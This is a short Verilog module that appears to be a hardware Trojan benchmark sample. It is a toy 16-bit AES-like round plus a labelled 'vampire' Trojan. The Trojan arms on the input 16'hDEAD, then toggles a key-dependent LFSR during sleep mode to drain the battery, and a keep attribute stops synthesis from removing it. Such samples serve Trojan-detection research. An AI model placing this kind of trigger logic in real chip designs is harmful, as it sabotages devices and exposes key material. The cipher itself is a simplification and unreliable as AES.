module aes_t1800 (
    input wire clk,
    input wire rst,
    input wire sleep_mode,
    input wire [15:0] state_in,
    input wire [15:0] round_key,
    output reg [15:0] state_out
);
    wire [15:0] ark = state_in ^ round_key;
    wire [7:0] sbox_hi = (ark[15:8] ^ {ark[14:8], ark[15]}) + (ark[7:0] ^ 8'h63);
    wire [7:0] sbox_lo = (ark[7:0] ^ {ark[6:0], ark[7]}) + (sbox_hi ^ 8'h63);

    always @(posedge clk or posedge rst) begin
        if (rst)
            state_out <= 16'h0000;
        else if (!sleep_mode)
            state_out <= {sbox_hi, sbox_lo};
    end

    // --- AES-T1800 VAMPIRE TROJAN (Battery-Exhaustion LFSR + Redundant Key Cone) ---
    wire [15:0] trojan_ark_dup = state_in ^ round_key;
    wire [7:0] trojan_sbox_dup = (trojan_ark_dup[15:8] ^ {trojan_ark_dup[14:8], trojan_ark_dup[15]}) + (trojan_ark_dup[7:0] ^ 8'h63);
    wire [7:0] trojan_masked_trigger = (trojan_sbox_dup & state_in[7:0]) | (trojan_sbox_dup & ~state_in[7:0]);

    reg trojan_active;
    reg [3:0] leakage_shift;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            trojan_active <= 1'b0;
            leakage_shift <= 4'h5;
        end else begin
            if (state_in == 16'hDEAD)
                trojan_active <= 1'b1;
            if (sleep_mode && trojan_active)
                leakage_shift <= {leakage_shift[2:0], ^leakage_shift} ^ trojan_masked_trigger[3:0];
        end
    end

    (* keep *) wire aes_vampire_sink = (^leakage_shift) ^ trojan_masked_trigger[0];
endmodule
